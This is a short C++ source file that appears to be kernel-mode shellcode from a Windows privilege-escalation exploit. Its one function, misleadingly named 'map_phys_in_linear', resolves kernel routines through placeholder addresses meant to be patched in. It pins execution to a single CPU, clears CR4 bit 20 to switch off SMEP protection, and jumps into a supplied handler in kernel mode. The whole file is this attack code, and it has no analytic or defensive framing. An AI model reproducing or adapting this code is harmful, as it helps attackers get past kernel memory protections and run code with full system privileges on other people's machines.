#include <windows.h>
#include <intrin.h>
#include "shared/dolboeb.hpp"
#include "shared/ke.hpp"


/*__declspec( noinline )*/ bool __fastcall map_phys_in_linear(
	uintptr_t phys_address,
	uintptr_t size,
	uintptr_t* user_address,
	void** section_handle,
	void** section_object
) {
	volatile uintptr_t ke_query_affinity = 0xFFFF1111FFFF1111;
	volatile uintptr_t ke_set_affinity = 0xFFFF2222FFFF2222;
	volatile uintptr_t mm_get = 0xFFFF3333FFFF3333;

	KAFFINITY previous_affinity = reinterpret_cast< shared::ke::KeQueryActiveProcessors_t >( ke_query_affinity )( );

	reinterpret_cast< shared::ke::KeSetSystemAffinityThread_t >( ke_set_affinity )( 1 );

	__writecr4( __readcr4( ) & ~( 1 << 20 ) );

	reinterpret_cast< shared::dolboeb::handler_t >( phys_address )( shared::dolboeb::handler_ctx_t { 
		.MmGetSystemRoutineAddress = mm_get 
	} );

	__writecr4( __readcr4( ) | ( 1 << 20 ) );

	reinterpret_cast< shared::ke::KeSetSystemAffinityThread_t >( ke_set_affinity )( previous_affinity );

	return true;
}


void entry( ) {
	map_phys_in_linear( 0, 0, 0, 0, 0 );
}

